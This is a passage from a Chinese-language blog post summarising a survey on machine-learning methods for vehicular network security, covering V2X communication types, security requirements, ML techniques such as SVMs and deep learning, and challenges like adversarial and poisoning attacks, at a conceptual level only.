<blockquote>
<p>用於數據傳輸的通信類型：本文討論了用於車載網絡數據傳輸的不同通信類型。 其中包括專用短程通信 (DSRC)、蜂窩車聯網 (C-V2X) 和 IEEE 802.11p。</p>
<ul>
<li><p>安全攻擊的分類和要求：包括physical layer attacks, MAC layer attacks, network layer attacks, transport layer attacks, application layer attacks, and social engineering attacks。</p>
</li>
<li><p>車載網絡的各種安全挑戰和要求:confidentiality, integrity, availability, authentication, non-repudiation, privacy preservation, trust management, intrusion detection&#x2F;prevention systems (IDS&#x2F;IPS), and driver identification&#x2F;fingerprinting。</p>
<ul>
<li>保密性Confidentiality : 最基本的要求之一是保證只有合法用戶才能訪問數據。 機密性使用基於安全密鑰和可信證書的加密技術來確保只有合法的數據用戶才能訪問。 大多數保密工作都是關於密鑰管理的。<br>  如果攻擊者可以訪問密鑰，他就可以闖入系統並濫用機密數據。 因此，在車載網絡中保證機密性對於保護車輛和駕駛員的個人數據非常重要</li>
<li>可用性Availability :  確保任何網絡的應用程序和進程的功能可用性是一項重要的安全要求。 有許多針對 VANET 中服務或通信通道可用性的嚴重攻擊很難處理 [13]。 不同類型的攻擊可能發生在網絡的不同級別。 如果出現意外情況，提前採取措施並確保系統的可用性對於網絡的成功運行至關重要。 在發生攻擊時保持車輛和基礎設施之間的通信正常運行是基本安全要求之一。 我們在第 IV 節中討論了不同的基於 ML 的解決方案來檢測攻擊並確保可用性。</li>
<li>完整性Integrity :  在將數據從車輛傳輸到基礎設施或從車輛傳輸到車輛時，保持數據和信息的真實形式非常重要。 數據的任何更改或更改都可能導致不良序列。車載網絡的完整性是為了確保原創性<br>  數據並保護其免受對手的任何更改、破壞或更改。 文獻中通常使用公鑰基礎設施 (PKI) 和密碼方案來確保車輛網絡的完整性 [8]。</li>
<li>隱私Privacy :  隱私是車載網絡安全的一項極其重要的要求。 它是一種保護車輛敏感信息免受攻擊者攻擊的方法。 在車載網絡的上下文中，它進一步分為位置隱私和用戶隱私。 駕駛員&#x2F;車輛的位置和身份非常敏感，必須對攻擊者隱藏。 然而，可信機構必須知道位置信息以提供更好的服務。 有許多基於用戶位置向用戶提供服務的 LBS。 在這種情況下，保護位置的隱私免受攻擊者的攻擊，同時確保其對服務提供實體的安全可用性是非常具有挑戰性的 [16]。</li>
<li>身份驗證Authentication : 在向系統請求任何服務之前，車輛總是會向系統驗證自己的身份。 有兩種類型的認證，消息認證和節點認證。 當車輛成為任何新網絡的一部分時，它會通過網絡驗證其節點信息（即身份、地址和相關信息）。 這有助於系統區分合法節點和惡意節點。 但是，當消息在兩輛車之間傳輸時，必須對其進行身份驗證以確保完整性。 無法維護車載網絡安全的第一步可能會導致網絡完全損壞。</li>
<li>信任Trust : 是安全的一個重要方面，用於增強系統對攻擊者的保護級別。 信任可以歸類為一個實體對屬於同一組網絡的另一個實體的信念。 在車載網絡中，信任計算是安全要求的附加步驟，與隱私保護、可用性和密鑰管理一起使用，以確保數據的高度安全傳輸 [14]。 文獻中存在信任計算方案（在面向實體和麵向數據的背景下），它利用網絡中車輛的歷史交互將其分類為可信的 [97]。 在車載網絡中，通過執行信任計算作為基本安全要求來確保車輛之間的誠實非常重要</li>
</ul>
<p>  <img src="/img/vehicle_Untitled_10.png" alt="Security requirements and ML-based literature"></p>
<p>  Security requirements and ML-based literature</p>
</li>
</ul>
<p><img src="/img/vehicle_Untitled_11.png" alt="V2X RF Vulnerabilities and Attack Vectors"></p>
<p>V2X RF Vulnerabilities and Attack Vectors</p>
</blockquote>
</li>
</ul>
<p>車輛網絡安全中的 ML 方法：</p>
<ul>
<li>討論了不同的 ML 方法，例如監督學習、無監督學習和強化學習。</li>
</ul>
<p><img src="/img/vehicle_Untitled_12.png" alt="ML TECHNIQUES APPLIED TO VEHICULAR SECURITY"></p>
<p>ML TECHNIQUES APPLIED TO VEHICULAR SECURITY</p>
<ul>
<li>深度學習、決策樹、支持向量機 (SVM) 和隨機森林是一些常用的 ML 技術。</li>
</ul>
<p><img src="/img/vehicle_Untitled_13.png" alt="ML approaches in the context of vehicular network security"></p>
<p>ML approaches in the context of vehicular network security</p>
<p>文獻綜述：</p>
<ul>
<li>本文回顧了使用 ML 策略提供不同安全和隱私解決方案的文獻。</li>
<li>它簡要解釋和比較了不同的解決方案，並提供了解決方案的表格形式。</li>
</ul>
<p><img src="/img/vehicle_Untitled_14.png" alt="COMPARISON OF SURVEYS ON ML AND/OR SECURITY IN VEHICULAR NETWORKS"></p>
<p>COMPARISON OF SURVEYS ON ML AND&#x2F;OR SECURITY IN VEHICULAR NETWORKS</p>
<p><img src="/img/vehicle_Untitled_15.png" alt="Security solutions and ML-based literature."></p>
<p>Security solutions and ML-based literature.</p>
<p><img src="/img/vehicle_Untitled_16.png" alt="SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML"></p>
<p>SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML</p>
<p><img src="/img/vehicle_Untitled_17.png" alt="SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML</p>
<p><img src="/img/vehicle_Untitled_18.png" alt="SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML</p>
<p><img src="/img/vehicle_Untitled_19.png" alt="SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML"></p>
<p>SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML</p>
<p><img src="/img/vehicle_Untitled_20.png" alt="SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML"></p>
<p>SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML</p>
<p>貢獻：</p>
<ul>
<li>作者對在車輛網絡安全中使用 ML 技術的最新技術進行了深入研究。</li>
<li>本文討論了廣泛的安全問題，包括攻擊、隱私、信任、入侵檢測和驅動程序識別&#x2F;指紋識別。</li>
</ul>
<p>基於 ML 的安全挑戰解決方案：</p>
<ul>
<li><p>作者根據在車輛網絡應用中的使用對文獻中開發的 ML 技術進行分類。</p>
<ul>
<li>入侵檢測：使用監督學習、非監督學習或混合方法來檢測車輛網絡中的惡意活動。-</li>
<li>隱私保護：使用差分隱私、同態加密或其他隱私保護技術來保護敏感數據。</li>
<li>信任管理：使用基於信譽的系統或信任模型來評估車輛網絡中車輛和節點的可信度。</li>
<li>駕駛員身份識別&#x2F;指紋識別：使用駕駛行為等生物識別數據，生理信號或面部識別來識別駕駛員並防止未經授權進入車輛。</li>
</ul>
</li>
<li><p>他們解釋了這些 ML 技術在應對各種安全挑戰時的解決方法和工作原理。</p>
<pre><code>    1.Support Vector Machines (SVMs):：
</code></pre>
<ul>
<li>SVM 是一種監督學習算法，可用於分類和回歸分析。</li>
<li>在車載網絡中，SVM 可用於入侵檢測、信任管理和駕駛員識別&#x2F;指紋識別。</li>
</ul>
<p>  2.Decision Trees：</p>
<ul>
<li>決策樹是一種監督學習算法，可用於分類和回歸分析。</li>
<li>在車載網絡中，決策樹可用於入侵檢測和駕駛員識別&#x2F;指紋識別。</li>
</ul>
<p>  3.Random Forests：</p>
<ul>
<li>隨機森林是一種集成學習方法，它結合了多個決策樹以提高準確性並減少過度擬合。</li>
<li>在車載網絡中，隨機森林可用於入侵檢測。</li>
</ul>
<p>  4.Deep Learning：</p>
<ul>
<li>深度學習是機器學習的一個子集，它使用人工神經網絡對數據中的複雜模式進行建模。</li>
<li>在車載網絡中，深度學習可用於交通預測、軌跡預測、入侵檢測和駕駛員識別&#x2F;指紋識別。</li>
</ul>
<p>  5.Clustering：</p>
<ul>
<li>聚類是一種無監督學習技術，它根據相似的數據點的特徵將它們分組在一起。</li>
<li>在車載網絡中，聚類可用於異常檢測和入侵檢測。</li>
</ul>
<p>  6.Reinforcement Learning:</p>
<ul>
<li>強化學習是一種機器學習，其中代理學習通過與其環境交互來做出決策。</li>
<li>在車載網絡中，強化學習可用於交通控制和擁塞管理。</li>
</ul>
</li>
</ul>
<p>ML 方法的優缺點:</p>
<ol>
<li>基於機器學習的車載網絡安全優勢：基於機器學習的解決方案可以檢測以前未知的攻擊並適應不斷變化的環境，使其適用於動態和復雜的車載網絡。 他們還可以分析大量數據並做出準確的預測或決策，這對於實時檢測攻擊至關重要。</li>
<li>基於 ML 的車載網絡安全的缺點：基於 ML 的解決方案需要大量的計算資源，這對於資源受限的車載網絡來說可能是一個挑戰。 它們還需要大量標記數據來訓練模型，這在實踐中可能很難獲得。 此外，如果沒有經過適當的培訓或驗證，它們可能會產生誤報或錯過一些攻擊。</li>
<li>基於 ML 的車載網絡安全的主要挑戰：本文確定了在使用基於 ML 的車載網絡安全解決方案時需要解決的幾個關鍵挑戰。 其中包括設計計算效率高且需要更少資源的輕量級模型； 開發有效的特徵選擇技術，可以從原始數據中提取相關特徵； 解決可以操縱輸入數據以逃避檢測的對抗性攻擊問題； 在收集和分析敏感數據的同時確保隱私保護。</li>
</ol>
<p>IoV 中的潛在應用：</p>
<ul>
<li>本文探討了 ML 技術在車聯網 (IoV) 中的潛在應用。<ul>
<li>交通預測、軌跡預測、擁堵控制、聯網車輛的入侵檢測以及提高車輛網絡的安全性是一些潛在的應用。<ol>
<li>Traffic prediction：<ul>
<li>機器學習技術可用於實時預測交通模式和擁堵程度。</li>
<li>此信息可用於優化交通流量並減少旅行時間。</li>
</ul>
</li>
<li>Trajectory prediction：<ul>
<li>機器學習技術可用於根據車輛的當前位置和速度預測車輛的軌跡。</li>
<li>此信息可用於避免碰撞和路線規劃。</li>
</ul>
</li>
<li>Congestion control：<ul>
<li>機器學習技術可用於控制交通流量並減少城市地區的擁堵。</li>
<li>這可以通過優化交通信號時間、重新安排車輛路線或調整限速來實現。</li>
</ul>
</li>
<li>Intrusion detection in connected vehicles:<ul>
<li>機器學習技術可用於檢測聯網車輛中的惡意活動，例如黑客攻擊或未經授權的訪問。</li>
<li>此信息可用於防止網絡攻擊和保護敏感數據。</li>
</ul>
</li>
<li>Improving the security of vehicular networks:<ul>
<li>機器學習技術可用於檢測安全威脅並防止對車輛網絡的攻擊。</li>
<li>這包括入侵檢測、信任管理、隱私保護和驅動程序識別&#x2F;指紋識別。</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>局限性和挑戰：</p>
<ul>
<li>討論了在車輛網絡中使用基於 ML 的方法的局限性和挑戰<ol>
<li>訓練數據有限：<ul>
<li>機器學習算法需要大量的訓練數據來學習模式並做出準確的預測。</li>
<li>在車載網絡中，由於資源有限和隱私問題，收集足夠的訓練數據可能具有挑戰性。</li>
</ul>
</li>
<li>動態環境：<ul>
<li>車輛網絡是高度動態的環境，條件可能會迅速變化。</li>
<li>這會使 ML 算法難以適應不斷變化的條件並做出準確的預測。</li>
</ul>
</li>
<li>安全威脅：<ul>
<li>機器學習算法可能容易受到對抗性攻擊或中毒攻擊等安全威脅。</li>
<li>對手可以操縱訓練數據或將惡意代碼注入 ML 模型以損害其性能。</li>
</ul>
</li>
<li>隱私問題：<ul>
<li>機器學習算法可能需要訪問敏感數據，例如位置信息或駕駛行為。</li>
<li>這會引起隱私問題，需要仔細考慮隱私保護技術。</li>
</ul>
</li>
<li>計算複雜度：<ul>
<li>某些 ML 算法計算量大，需要強大的處理能力。</li>
<li>在車載網絡中，由於資源有限和實時要求，這可能是一個挑戰。</li>
</ul>
</li>
</ol>
</li>
</ul>
<p>觀察和經驗教訓：</p>
<ul>
<li>作者在結束他們的工作之前展示了觀察結果和經驗教訓<ol>
<li><p>基於機器學習的解決方案在應對車載網絡安全挑戰方面取得了顯著成就</p>
<ol>
<li>Achieving high accuracy in driver identification：</li>
</ol>
<ul>
<li>ML 技術已用於根據駕駛行為識別駕駛員。</li>
<li>本文介紹的一項工作使用基於決策樹的 ML 技術在 10 個駕駛員中實現了約 99% 的準確度，該技術應用了 OBD-II 協議數據的 51 個特徵。</li>
</ul>
<p>  b. Detecting security threats：</p>
<ul>
<li>機器學習技術已被用於檢測安全威脅，例如聯網車輛中的入侵企圖或惡意活動。</li>
<li>論文中提出的一項工作使用無監督學習方法來檢測車輛網絡流量中的異常情況，準確率達到 98%。</li>
</ul>
<p>  c. Improving privacy preservation：</p>
<ul>
<li>機器學習技術已被用於改進車載網絡中的隱私保護。</li>
<li>論文中提出的一項工作提出了一種隱私保護框架，該框架使用差分隱私並在保護隱私的同時實現了高實用性。</li>
</ul>
<p>  d. Enhancing trust management：</p>
<ul>
<li>機器學習技術已被用於增強車輛網絡中的信任管理。</li>
<li>論文中提出的一項工作提出了一種信任管理框架，該框架結合了監督和非監督學習方法，並實現了高精度。</li>
</ul>
</li>
<li><p>基於機器學習的解決方案的性能取決於訓練數據的質量和數量。</p>
 <aside>
 💡 因為 ML 算法根據訓練數據學習模式並做出預測。 如果訓練數據質量差或數量不足，機器學習算法可能無法學習到準確的模式並做出準確的預測。
 
 </aside>
 
 <aside>
 💡 例如，在車載網絡中，由於資源有限和隱私問題，收集足夠的訓練數據可能具有挑戰性。 如果訓練數據有限或有偏差，ML 算法可能無法很好地泛化到新情況或準確檢測安全威脅。
 
 </aside>
 
 <aside>
 💡 因此，仔細選擇和預處理訓練數據以確保它代表問題域並包含足夠的信息以供 ML 算法學習準確的模式非常重要。 此外，數據增強或遷移學習等技術可用於增加可用訓練數據的數量並提高基於 ML 的解決方案的性能。
 
 </aside>
 </li>
<li><p>車輛網絡的動態特性要求 ML 算法具有適應性和彈性以適應不斷變化的條件。</p>
 <aside>
 💡 車輛網絡的動態特性要求 ML 算法能夠適應不斷變化的條件並具有彈性，因為網絡拓撲、交通模式和環境條件可能會快速且不可預測地變化。
 
 </aside>
 
 <aside>
 💡 例如，在車載網絡中，車輛的移動會導致網絡拓撲結構和信號強度的頻繁變化。 此外，交通模式可能會因一天中的時間或地點而異。 這些變化可能會影響基於 ML 的解決方案的性能，這些解決方案依賴於靜態模型或關於問題域的假設。
 
 </aside>
 
 <aside>
 💡 因此，車載網絡中使用的 ML 算法需要能夠適應不斷變化的條件並實時從新數據中學習。 這需要在線學習或強化學習等技術，使算法能夠根據新的觀察結果更新其模型。 此外，遷移學習或領域適應等技術可用於改進基於 ML 的解決方案在不同場景或環境中的泛化。
 
 </aside>
 
 <aside>
 💡 總體而言，車輛網絡的動態特性要求 ML 算法能夠適應不斷變化的條件並具有彈性，以便提供準確可靠的安全解決方案。
 
 </aside>
 </li>
<li><p>對抗性攻擊或中毒攻擊等安全威脅可能會損害基於 ML 的解決方案的性能</p>
 <aside>
 💡 因為它們可以操縱訓練數據或 ML 算法的輸入數據，從而導致不正確的預測或決策。
 
 </aside>
 
 <aside>
 💡 例如，在對抗性攻擊中，攻擊者可以故意修改輸入數據以導致 ML 算法的錯誤分類或錯誤預測。 這可以通過向輸入數據添加人類無法察覺但會顯著影響 ML 算法輸出的小擾動來實現。
 
 </aside>
 
 <aside>
 💡 同樣，在中毒攻擊中，攻擊者可以操縱用於訓練 ML 算法的訓練數據。 這可以通過將惡意樣本注入訓練數據集來完成，這些樣本旨在使模型偏向於做出不正確的預測或決策。
 
 </aside>
 
 <aside>
 💡 這些攻擊在安全性對安全和隱私至關重要的車載網絡中尤其有害。 例如，對自動駕駛汽車的對抗性攻擊可能會導致其做出錯誤的決定並導致事故。 同樣，對駕駛員身份識別系統的中毒攻擊可能會損害其準確性，並允許未經授權訪問車輛。
 
 </aside>
 
 <aside>
 💡 因此，對於車載網絡中使用的基於 ML 的解決方案來說，能夠抵禦這些類型的攻擊非常重要。 對抗性訓練或異常值檢測等技術可用於提高抵禦對抗性攻擊的能力。 此外，數據清理或異常檢測等技術可用於檢測和減輕中毒攻擊。
 
 </aside>
 </li>
<li><p>隱私保護技術對於保護車載網絡中的敏感數據至關重要。</p>
 <aside>
 💡 隱私保護技術對於保護車載網絡上的敏感數據至關重要，因為車載網絡經常傳輸敏感信息，例如位置、駕駛員身份和車輛狀態。 攻擊者可以使用此信息來跟踪個人或車輛的移動、危及乘客的安全或竊取個人信息。
 
 </aside>
 
 <aside>
 💡 隱私保護技術旨在通過確保未授權方無法訪問這些敏感信息來保護這些信息。 這可以使用加密、匿名化或差分隱私等技術來完成。
 
 </aside>
 
 <aside>
 💡 例如，在車載網絡中，位置隱私是安全的關鍵要求。 知道車輛位置的攻擊者可以使用此信息發起干擾或竊聽等攻擊。 因此，可以使用 k-匿名或位置混淆等技術來保護車輛位置的隱私，同時仍然允許授權方（例如服務提供商）訪問此信息。
 
 </aside>
 
 <aside>
 💡 同樣，用戶隱私在車輛網絡中也很重要，在車輛網絡中，駕駛員識別系統可用於訪問控製或個性化服務。 同態加密或安全多方計算等技術可用於保護駕駛員身份的隱私，同時仍允許授權方驗證其身份。
 
 </aside>
 
 <aside>
 💡 總的來說，隱私保護技術對於保護車載網絡上的敏感數據和確保車載網絡安全可信至關重要。
 
 </aside>
 </li>
<li><p>結合多種 ML 技術的混合方法可以提高安全解決方案的準確性和穩健性。</p>
 <aside>
 💡 混合方法結合了多種 ML 技術，例如監督學習、無監督學習和強化學習，以提高車載網絡中安全解決方案的準確性和穩健性。
 
 </aside>
 
 <aside>
 💡 監督學習是一種 ML 算法從標記的訓練數據中學習以做出預測或決策的技術。 無監督學習是一種 ML 算法從未標記的數據中學習以發現數據中的模式或結構的技術。 強化學習是一種技術，其中 ML 算法通過與環境交互並以獎勵或懲罰的形式接收反饋來學習。
 
 </aside>
 
 <aside>
 💡 混合方法可以結合這些技術來利用它們的優勢並克服它們的劣勢。 例如，監督學習可用於從標記數據中學習並對已知威脅做出準確預測。 無監督學習可用於發現數據中可能指示以前未知威脅的新模式或異常。 強化學習可用於學習動態環境中安全決策的最佳策略。
 
 </aside>
 
 <aside>
 💡 此外，混合方法(hybrid approach) 還可以結合其他技術，例如基於規則的系統或專家系統，以提供單獨使用 ML 算法可能無法捕獲的額外上下文或領域知識。
 
 </aside>
 
 <aside>
 💡 總體而言，結合多種 ML 技術和其他技術的混合方法可以利用它們的互補優勢並提供更全面的安全挑戰解決方案，從而提高車載網絡安全解決方案的準確性和穩健性。
 
 </aside>
 </li>
<li><p>一些 ML 算法的計算複雜性在資源有限的車輛網絡中可能是一個挑戰。</p>
 <aside>
 💡 ML 算法的計算複雜性在資源受限的車輛網絡中是一個挑戰，包括深度學習 (DL) 算法，例如卷積神經網絡 (CNN) 和遞歸神經網絡 (RNN)。 這些算法需要大量輸入數據和計算資源才能實現高精度，這在資源有限的車載網絡中可能是一個挑戰。
 
 </aside>
 
 <aside>
 💡 為了應對這一挑戰，研究人員提出了幾種方法或替代方案。 一種方法是使用輕量級 DL 模型，這些模型旨在提高計算效率並需要更少的資源。 例如，一些研究人員提出在預訓練的監督 LSTM 模型上使用一次性遷移學習來檢測車輛網絡中的入侵 [94]。 這種方法使用輕量級 DL 模型，該模型需要較少的計算，同時仍能實現高精度。
 
 </aside>
 
 <aside>
 💡 另一種方法是使用傳統的 ML 算法，例如決策樹或支持向量機 (SVM)，它們的計算複雜性低於 DL 算法。 這些算法仍然可以提供有效的安全解決方案，同時需要更少的資源。
 
 </aside>
 
 <aside>
 💡 此外，研究人員還提議使用邊緣計算或霧計算架構將計算從車輛網絡中資源受限的設備卸載到更強大的邊緣或霧節點。 這可以減少設備的計算負擔，同時仍然提供準確及時的安全解決方案。
 
 </aside>
 
 <aside>
 💡 總體而言，有多種方法和替代方案可用於解決基於 ML 的車輛安全解決方案中計算複雜性的挑戰。 這些包括使用輕量級 DL 模型、傳統 ML 算法，或將計算卸載到更強大的邊緣或霧節點。
 
 </aside></li>
</ol>
</li>
</ul>
<hr>
<p><img src="/img/vehicle_353785_0.jpg" alt="353785_0.jpg"></p>
<p><img src="/img/vehicle_353788_0.jpg" alt="353788_0.jpg"></p>
<p><img src="/img/vehicle_353787_0.jpg" alt="353787_0.jpg"></p>
<p><img src="/img/vehicle_353786_0.jpg" alt="353786_0.jpg"></p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so/">https://www.notion.so</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>